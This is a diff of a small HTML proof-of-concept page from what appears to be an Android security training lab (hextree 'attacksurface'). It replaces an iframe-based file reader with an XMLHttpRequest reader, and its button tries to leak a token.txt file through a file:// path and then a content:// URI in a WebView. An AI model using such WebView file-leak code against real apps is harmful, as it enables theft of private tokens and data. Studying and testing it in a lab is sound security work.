@@ -3,34 +3,24 @@
 <head>
     <title>Test XMLHttpRequest with content://</title>
     <script type="text/javascript">
-     function leakFileIframe(url) {
-          const iframe = document.createElement('iframe');
-          iframe.onload = () => {
-            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-            if (!iframeDoc) return;
-            const contentType = iframeDoc.contentType;
-            const data = iframeDoc.documentElement.innerHTML;
-            const blob = new Blob([data], { type: contentType });
-            const reader = new FileReader();
-            const contentPromise = new Promise((resolve, reject) => {
-              reader.onload = () => resolve(reader.result);
-              reader.onerror = reject;
-              reader.readAsText(blob);
-            });
-            contentPromise.then(content => {
-              if (content && !content.includes("net::ERR_")) {
-                console.log(content);
-              }
-            });
-          };
-          document.body.appendChild(iframe);
-          iframe.src = url;
+  function leakFileXHR(url) {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4 && xhr.responseText) {
+            console.log(xhr.responseText);
         }
+    };
+    xhr.onerror = function(error) {
+        // console.log(error);
+    }
+    xhr.send();
+}
     </script>
 </head>
 <body>
     <h1>Test XMLHttpRequest with content://</h1>
-    <button onclick="leakFileIframe('file:///data/data/io.hextree.attacksurface/files/token.txt')">Load File</button>
+    <button onclick="leakFileXHR('content://io.hextree.root/token.txt')">Load File</button>
     <div id="result"></div> <!-- Display content here -->
 </body>
 </html>
